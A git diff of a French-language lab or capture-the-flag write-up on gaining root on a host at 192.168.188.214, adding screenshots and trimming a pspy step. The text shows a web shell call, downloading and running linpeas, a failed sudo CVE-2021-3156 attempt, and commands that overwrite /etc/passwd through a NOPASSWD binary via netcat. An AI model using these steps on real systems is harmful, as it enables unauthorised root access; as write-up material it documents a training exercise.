@@ -96,7 +96,7 @@ curl "http://192.168.188.214/shell.php?cmd=id"
 ## 5. Élévation de Privilèges
 
 ### 5.1. Analyse avec Linpeas et PSPY  
-Téléchargement et exécution de **Linpeas** et **PSPY** pour identifier des vulnérabilités d’élévation de privilèges.
+Téléchargement et exécution de **Linpeas** pour identifier des vulnérabilités d’élévation de privilèges.
 
 ```bash
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh  
@@ -104,18 +104,22 @@ chmod +x linpeas.sh
 ./linpeas.sh  
 ```
 
-```bash
-wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64  
-chmod +x pspy64  
-./pspy64  
-```
+![image4](https://github.com/user-attachments/assets/c4f344e6-44df-449c-a698-e45703bea8ff)
+![image27](https://github.com/user-attachments/assets/0d0bce59-3dc3-4ed8-a216-92aac0194b0e)
 
 ### 5.2. Exploitation de CVE-2021-3156  
 Tentative d’exploitation de **CVE-2021-3156 (sudo heap overflow)** pour obtenir un shell root.  
 ❌ **Échec :** La version du système ne permet pas l’exploitation de cette faille.
 
+![image2](https://github.com/user-attachments/assets/0a7142a3-6757-4040-b7ed-4a8da0eb4025)
+
 ### 5.3. Exploitation via ums2net  
 L'exécutable `/usr/sbin/ums2net` est utilisable **sans mot de passe (NOPASSWD)**, ce qui permet de **modifier `/etc/passwd`** et d’ajouter un utilisateur root.
+
+![image3](https://github.com/user-attachments/assets/9dd238a9-4a5f-4786-af8c-5ee2070216fb)
+![image7](https://github.com/user-attachments/assets/a2ece629-6572-489a-9bb6-a8975d71e1cf)
+![image23](https://github.com/user-attachments/assets/14e29689-12c6-4b94-ad2a-3f981a7cc3a1)
+
 
 #### Modification de `/etc/passwd`  
 ```bash
@@ -123,6 +127,9 @@ echo 'aurelien:$6$IPVFVjVKK55o19kF$XqJHT3H5Qcmk96/iaLUfcC3UQPEYF0yFGzRtTinb/9NfQ
 nc -v 192.168.188.214 5000 < ./passwd  
 sudo /usr/sbin/ums2net -c /tmp/config -d  
 ```
+
+![image12](https://github.com/user-attachments/assets/5fea9bec-9da2-4d45-9fd5-3af7f592c215)
+
 
 ✅ **Accès root obtenu** via l’utilisateur **"aurelien"**.
 
